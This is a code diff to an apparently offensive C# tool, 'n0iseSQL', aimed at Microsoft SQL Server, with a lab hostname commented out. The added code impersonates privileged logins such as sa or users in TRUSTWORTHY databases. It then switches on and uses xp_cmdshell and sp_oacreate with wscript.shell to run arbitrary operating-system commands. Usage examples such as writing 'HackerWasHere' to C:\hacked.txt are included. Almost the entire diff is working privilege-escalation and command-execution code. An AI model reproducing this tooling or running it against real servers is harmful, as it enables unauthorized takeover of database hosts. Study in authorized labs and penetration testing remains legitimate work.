@@ -16,7 +16,13 @@ namespace n0iseSQL
                 Console.WriteLine("\tauthenticate");
                 Console.WriteLine("\tconnectShare [smbShare] | example: connectShare \\\\server.domain.local\\share");
                 Console.WriteLine("\tenumLoginImpersonation");
-                Console.WriteLine("\timpersonateLogin [loginToImpersonate] | example: impersonateLogin sa");
+                Console.WriteLine("\timpersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
+                Console.WriteLine("\t\texample: impersonateLogin sa none");
+                Console.WriteLine("\t\texample: impersonateLogin sa xp_cmdshell whoami");
+                Console.WriteLine("\t\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+                Console.WriteLine("\timpersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
+
+                
                 return;
             }
 
@@ -41,14 +47,40 @@ namespace n0iseSQL
 
             if (action == "impersonateLogin")
             {
-                if (args.Length < 4)
+                if (args.Length < 5)
                 {
-                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateLogin [loginToImpersonate] | example: impersonateLogin sa");
+                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
+                    Console.WriteLine("\texample: impersonateLogin sa none");
+                    Console.WriteLine("\texample: impersonateLogin sa xp_cmdshell whoami");
+                    Console.WriteLine("\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+
+                    return;
+                } else
+                {
+                    if (args[4].ToString() != "none")
+                    {
+                        if (args.Length < 6)
+                        {
+                            Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateLogin [loginToImpersonate] [execType:none|xp_cmdshell|sp_oa] [commandToRun]");
+                            Console.WriteLine("\texample: impersonateLogin sa none");
+                            Console.WriteLine("\texample: impersonateLogin sa xp_cmdshell whoami");
+                            Console.WriteLine("\texample: impersonateLogin sa sp_oa \"echo HackerWasHere > C:\\hacked.txt\"");
+                            return;
+                        }
+                    }
+                }
+            }
+
+            if (action == "impersonateUser")
+            {
+                if (args.Length < 5)
+                {
+                    Console.WriteLine("n0iseSQL.exe [sqlServer] [database] impersonateUser [databaseTRUSTWORTHYenabled] [userToImpersonate] | example: impersonateUser msdb dbo");
                     return;
                 }
             }
 
-            
+
 
             //String sqlServer = "data.cyber-rangers.lab";
             String sqlServer = args[0];
@@ -148,6 +180,8 @@ namespace n0iseSQL
 
             if (action == "impersonateLogin")
             {
+                
+                String execType = args[4].ToString();
                 String loginToImpersonate = args[3].ToString();
                 Console.WriteLine("[+] Impersonating login: {0}",loginToImpersonate);
                 String executeas = String.Format("EXECUTE AS LOGIN = '{0}';",loginToImpersonate);
@@ -165,11 +199,73 @@ namespace n0iseSQL
                 command = new SqlCommand(querylogin, con);
                 reader = command.ExecuteReader();
                 reader.Read();
-                Console.WriteLine("[+] Logged in as: " + reader[0]);
+                Console.WriteLine("[+] Now executing code as: " + reader[0]);
+                reader.Close();
+
+                if (execType == "xp_cmdshell")
+                {
+                    String commandToExecute = args[5].ToString();
+                    Console.WriteLine("Command executing using xp_cmdshell: {0}", commandToExecute);
+                    String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; ";
+                    String execCmd = String.Format("EXEC xp_cmdshell {0}",commandToExecute);
+
+                    command = new SqlCommand(enable_xpcmd, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    command = new SqlCommand(execCmd, con);
+                    reader = command.ExecuteReader();
+                    reader.Read();
+                    Console.WriteLine("[+] Result of command is: " + reader[0]);
+                    reader.Close();
+                }
+
+                if (execType == "sp_oa")
+                {
+                    String commandToExecute = args[5].ToString();
+                    Console.WriteLine("Command executing using sp_oacreate and sp_oamethod: {0}", commandToExecute);
+                    String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
+                    //String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Temp\\file.txt\"';";
+                    String execCmd = String.Format("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{0}\"';",commandToExecute);
+
+                    command = new SqlCommand(enable_ole, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+
+                    command = new SqlCommand(execCmd, con);
+                    reader = command.ExecuteReader();
+                    reader.Close();
+                }
+
+            }
+
+            if (action == "impersonateUser")
+            {
+                String userToImpersonate = args[4].ToString();
+                String trustworthyDatabase = args[3].ToString();
+                Console.WriteLine("[+] Impersonating user: {0}", userToImpersonate);
+                Console.WriteLine("[+] Database with TRUSTWORTHY enabled: {0}", trustworthyDatabase);
+
+                String executeasUser = String.Format("use {0}; EXECUTE AS USER = '{1}';", trustworthyDatabase, userToImpersonate);
+                command = new SqlCommand(executeasUser, con);
+                try
+                {
+                    reader = command.ExecuteReader();
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[!] {0}", ex.Message.ToString());
+                }
+                reader.Close();
+
+                command = new SqlCommand(queryuser, con);
+                reader = command.ExecuteReader();
+                reader.Read();
+                Console.WriteLine("[+] Now executing code as: " + reader[0]);
                 reader.Close();
             }
 
-                Console.WriteLine("[+] Done!");
+            Console.WriteLine("[+] Done!");
             con.Close();
         }
     }
